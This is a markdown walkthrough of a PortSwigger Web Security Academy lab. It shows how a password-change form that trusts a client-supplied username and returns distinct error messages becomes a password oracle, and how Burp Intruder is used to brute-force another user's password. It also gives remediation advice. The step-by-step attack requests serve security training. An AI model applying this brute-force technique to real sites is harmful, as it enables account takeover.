# Password Brute-Force via Password Change

> 🔗 Lab: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change  
> 🎯 Topic: Password brute-force via password change  
> 🧪 Level: Practitioner  
> ✅ Status: Solved  

---

## 📚 Table of Contents

- [Password Brute-Force via Password Change](#password-brute-force-via-password-change)
  - [📚 Table of Contents](#-table-of-contents)
  - [🎯 Lab Objective](#-lab-objective)
  - [🧠 Required Knowledge](#-required-knowledge)
  - [🔐 Secure Password Change Flow](#-secure-password-change-flow)
  - [💥 Vulnerability Overview](#-vulnerability-overview)
  - [🧩 Password Oracle](#-password-oracle)
  - [⚠️ Why Hidden Fields Are Untrusted](#️-why-hidden-fields-are-untrusted)
  - [🔎 Reconnaissance](#-reconnaissance)
  - [🧪 Analyzing Application Messages](#-analyzing-application-messages)
  - [📨 Analyzing the HTTP Request](#-analyzing-the-http-request)
  - [🎯 Testing Carlos in Repeater](#-testing-carlos-in-repeater)
  - [🚀 Configuring Burp Intruder](#-configuring-burp-intruder)
  - [🔍 Identifying the Correct Password](#-identifying-the-correct-password)
  - [🔓 Logging in as Carlos](#-logging-in-as-carlos)
  - [🧩 Complete Attack Chain](#-complete-attack-chain)
  - [⚙️ Why the Attack Worked](#️-why-the-attack-worked)
  - [🧠 How to Think Like a Pentester](#-how-to-think-like-a-pentester)
  - [🛑 Common Mistakes](#-common-mistakes)
  - [🛡 Remediation](#-remediation)
  - [✅ Checklist](#-checklist)
  - [🧾 Conclusion](#-conclusion)

---

## 🎯 Lab Objective

Gain access to the `carlos` account by exploiting the vulnerable password change functionality.

Known credentials:

```text
Own account: wiener:peter
Target account: carlos
```

The attack requires:

- logging in as `wiener`;
- examining the password change form;
- identifying that the username is client-controlled;
- comparing responses for correct and incorrect current passwords;
- turning the feature into a password oracle;
- brute-forcing Carlos's password with Burp Intruder;
- logging in to Carlos's account.

---

## 🧠 Required Knowledge

A password change form usually accepts:

```text
current password
new password
confirm new password
```

The server should verify:

```text
1. The user is authenticated.
2. The target account is derived from the active session.
3. The current password belongs to that account.
4. The two new password values match.
```

The client must not be allowed to select the account whose password is being verified.

---

## 🔐 Secure Password Change Flow

```text
Authenticated session
        |
        v
Server identifies current user
        |
        v
Server verifies current password
        |
        v
Server compares new passwords
        |
        v
Server changes password
```

Conceptually secure code:

```python
user = session.authenticated_user

if not verify_password(user, current_password):
    return generic_error()

if new_password_1 != new_password_2:
    return generic_error()

change_password(user, new_password_1)
```

The application should not use:

```python
username = request.form["username"]
```

to determine the account being modified.

---

## 💥 Vulnerability Overview

The request contains:

```text
username=wiener
```

even though the user is already identified through the session cookie.

Changing this value to:

```text
username=carlos
```

causes the server to verify Carlos's current password while the attacker remains authenticated as Wiener.

The application also returns distinguishable messages:

```text
Current password is incorrect
```

and:

```text
New passwords do not match
```

These messages reveal whether the tested current password is correct.

---

## 🧩 Password Oracle

An oracle does not disclose a secret directly. Instead, it provides observable responses that allow an attacker to infer the secret.

Incorrect candidate:

```text
current-password=wrong
new-password-1=123
new-password-2=abc

→ Current password is incorrect
```

Correct candidate:

```text
current-password=correct
new-password-1=123
new-password-2=abc

→ New passwords do not match
```

Attack logic:

```text
Candidate password
       |
       v
Server verifies it for Carlos
       |
       +--> Current password is incorrect
       |        Candidate is wrong
       |
       +--> New passwords do not match
                Candidate is correct
```

The two new passwords are intentionally different. This prevents an actual password change while preserving the response difference.

---

## ⚠️ Why Hidden Fields Are Untrusted

The page may contain:

```html
<input type="hidden" name="username" value="wiener">
```

A hidden field is only hidden from normal visual rendering. It remains fully controlled by the client.

It can be modified with:

- Burp Repeater;
- Burp Intruder;
- browser developer tools;
- custom scripts;
- any HTTP client.

Core principle:

```text
Hidden does not mean trusted.
```

---

## 🔎 Reconnaissance

Log in using:

```text
wiener:peter
```

Navigate to:

```text
My account → Change password
```

Test different input combinations.

Reconnaissance goals:

- identify the endpoint;
- identify all parameters;
- determine validation order;
- compare error messages;
- test username substitution;
- determine whether brute force is feasible.

---

## 🧪 Analyzing Application Messages

### Test A: Incorrect current password

```text
Current password: wrong
New password: 123
Confirm password: abc
```

Response:

```text
Current password is incorrect
```

### Test B: Correct current password

```text
Current password: peter
New password: 123
Confirm password: abc
```

Response:

```text
New passwords do not match
```

The second response proves that the current password check succeeded and the application moved to the next validation step.

---

## 📨 Analyzing the HTTP Request

Intercepted request:

```http
POST /my-account/change-password HTTP/2
Host: 0a83009103a9f078856b4164007100a6.web-security-academy.net
Cookie: session=SB4VMOJ7I5hUfMs1UBFImebala9rGAd8
Content-Type: application/x-www-form-urlencoded

username=wiener&current-password=peter&new-password-1=123&new-password-2=abc
```

Important parameters:

```text
username
current-password
new-password-1
new-password-2
```

The critical issue is that `username` is supplied by the client even though the active session already identifies the user.

---

## 🎯 Testing Carlos in Repeater

Send the request to Burp Repeater and change:

```text
username=wiener
```

to:

```text
username=carlos
```

Resulting body:

```http
username=carlos&current-password=peter&new-password-1=123&new-password-2=abc
```

The response is:

```text
Current password is incorrect
```

This is expected because `peter` is Wiener's password.

The important observation is that the server accepted `username=carlos` and attempted to verify another user's password.

---

## 🚀 Configuring Burp Intruder

### 1. Attack type

Select:

```text
Sniper
```

Only one parameter is being brute-forced.

### 2. Payload position

Clear automatically selected positions:

```text
Clear §
```

Mark only the current password:

```http
username=carlos&current-password=§peter§&new-password-1=123&new-password-2=abc
```

Keep the new passwords different:

```text
new-password-1=123
new-password-2=abc
```

### 3. Payload type

Select:

```text
Simple list
```

Paste the candidate password list.

### 4. Grep - Match

Add:

```text
New passwords do not match
```

This flags the request where the current password is correct.

---

## 🔍 Identifying the Correct Password

Most responses contain:

```text
Current password is incorrect
```

One response contains:

```text
New passwords do not match
```

The matching payload is:

```text
159753
```

Therefore:

```text
Carlos's password: 159753
```

---

## 🔓 Logging in as Carlos

Log out of Wiener's account and authenticate with:

```text
Username: carlos
Password: 159753
```

Open:

```text
My account
```

The lab is solved.

---

## 🧩 Complete Attack Chain

```text
1. Log in as wiener:peter
2. Open the password change form
3. Test an incorrect current password
4. Observe Current password is incorrect
5. Test the correct current password
6. Observe New passwords do not match
7. Intercept POST /my-account/change-password
8. Identify the client-controlled username parameter
9. Send the request to Repeater
10. Change username=wiener to username=carlos
11. Confirm that another account can be targeted
12. Send the request to Intruder
13. Mark current-password as the payload position
14. Keep the new passwords different
15. Load the candidate password list
16. Add Grep Match: New passwords do not match
17. Start the attack
18. Identify payload 159753
19. Log out of Wiener
20. Log in as carlos:159753
21. Open My account
```

---

## ⚙️ Why the Attack Worked

The vulnerability resulted from several combined flaws.

### 1. Client-controlled account selection

The application trusts:

```text
username=carlos
```

instead of deriving the account from the session.

### 2. Broken authorization

A session belonging to Wiener can trigger password verification for Carlos.

### 3. Distinguishable errors

The application reveals which validation step failed.

### 4. Missing brute-force protection

Many password attempts can be submitted.

### 5. Oracle behavior

The two responses expose whether a candidate password is valid.

Conceptually vulnerable code:

```python
username = request.form["username"]
current_password = request.form["current-password"]
new_password_1 = request.form["new-password-1"]
new_password_2 = request.form["new-password-2"]

if not verify_password(username, current_password):
    return "Current password is incorrect"

if new_password_1 != new_password_2:
    return "New passwords do not match"

change_password(username, new_password_1)
```

---

## 🧠 How to Think Like a Pentester

When testing password change functionality, ask:

- Where does the server get the target username?
- Can `username`, `user_id`, `email`, or `account_id` be modified?
- Is the operation bound to the authenticated session?
- Are authorization checks enforced?
- Do responses differ for valid and invalid passwords?
- Do status codes differ?
- Does response length differ?
- Does response time differ?
- Is rate limiting present?
- Is account lockout present?
- Can lockout be bypassed by changing secondary fields?
- Can the password be accidentally changed during brute force?
- Is re-authentication required?
- Are existing sessions invalidated?

Core mindset:

```text
Do not test only the form.
Test the server-side business logic.
```

---

## 🛑 Common Mistakes

### Mistake 1. Brute-forcing the login page

The vulnerable endpoint is the password change feature.

### Mistake 2. Leaving username=wiener

This brute-forces the attacker's own account.

Correct value:

```text
username=carlos
```

### Mistake 3. Using matching new passwords

Dangerous:

```text
new-password-1=123
new-password-2=123
```

A correct current password may result in an actual password change.

Use:

```text
new-password-1=123
new-password-2=abc
```

### Mistake 4. Marking multiple payload positions

Only `current-password` should be marked.

### Mistake 5. Relying on response length unnecessarily

The exact message is a more reliable signal:

```text
New passwords do not match
```

### Mistake 6. Keeping automatic payload positions

Clear them before configuring the attack.

### Mistake 7. Forgetting to log out of Wiener

The final step requires authenticating as Carlos.

### Mistake 8. Trusting hidden fields

Hidden inputs remain attacker-controlled.

---

## 🛡 Remediation

### 1. Derive the account from the session

Correct:

```python
user = session.authenticated_user
```

Incorrect:

```python
user = request.form["username"]
```

### 2. Remove unnecessary username fields

A current-user password change form normally does not need a username parameter.

### 3. Use generic error responses

Example:

```text
Unable to change password
```

Do not reveal which validation step failed.

### 4. Apply rate limiting

Limit attempts per:

- account;
- session;
- IP;
- device;
- time window.

### 5. Add progressive delays

Increase the response delay after repeated failures.

### 6. Require re-authentication

Sensitive operations may require password re-entry or MFA.

### 7. Monitor anomalous behavior

Useful signals include:

- many password change requests;
- repeated invalid current passwords;
- one session targeting multiple accounts;
- high request frequency;
- repeated mismatched new-password values.

### 8. Avoid account-lockout-only defenses

Hard lockouts can introduce denial-of-service risks.

### 9. Invalidate active sessions after password changes

Existing sessions should be revoked or reviewed.

### 10. Protect the endpoint against CSRF

CSRF protection is required, although it does not replace proper authorization.

---

## ✅ Checklist

### Reconnaissance

- [ ] Logged in with the own account
- [ ] Located the password change feature
- [ ] Identified the endpoint
- [ ] Examined the form parameters
- [ ] Intercepted the request

### Logic analysis

- [ ] Tested an incorrect current password
- [ ] Tested a correct current password
- [ ] Compared response messages
- [ ] Identified the client-controlled username
- [ ] Tested username substitution

### Intruder

- [ ] Selected Sniper
- [ ] Cleared automatic positions
- [ ] Marked current-password
- [ ] Set username=carlos
- [ ] Kept new passwords different
- [ ] Loaded the candidate list
- [ ] Added Grep Match

### Exploitation

- [ ] Started the attack
- [ ] Found New passwords do not match
- [ ] Identified password 159753
- [ ] Logged out of Wiener
- [ ] Logged in as Carlos
- [ ] Opened My account
- [ ] Solved the lab

---

## 🧾 Conclusion

The application allowed the client to select the target account through the `username` parameter.

The server failed to bind the password change operation to the authenticated session and returned different messages for valid and invalid current passwords.

By intentionally submitting two different new passwords, the endpoint became a password oracle:

```text
Current password is incorrect
→ candidate is wrong
```

```text
New passwords do not match
→ candidate is correct
```

Burp Intruder identified:

```text
159753
```

The final credentials were:

```text
carlos:159753
```

Main lessons:

```text
Never trust a username supplied by the client.
```

```text
Sensitive operations must be bound to the active session.
```

```text
Different error messages can disclose secret state.
```

---

[⬆ Back to top](#password-brute-force-via-password-change)
